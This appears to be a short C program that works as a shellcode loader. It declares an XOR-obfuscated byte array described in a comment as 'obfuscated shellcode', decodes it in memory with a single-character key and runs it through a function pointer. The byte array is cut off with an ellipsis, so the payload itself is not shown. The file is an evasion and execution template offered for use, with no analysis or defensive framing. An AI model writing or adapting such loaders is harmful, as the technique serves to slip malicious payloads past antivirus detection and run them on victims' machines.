#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
// Our obfuscated shellcode
unsigned char buf[] = "\x20\x73\x12\x45\x4F\x02\xCF\x8A...x32\x71\x02\xDD\x02\xF3\x48";

int main (int argc, char **argv) 
{
  char xor_key = 'J';
  int arraysize = (int) sizeof(buf);
  for (int i=0; i<arraysize-1; i++){
    buf[i] = buf[i]^xor_key;
  }
  int (*ret)() = (int(*)())buf;
  ret();
}
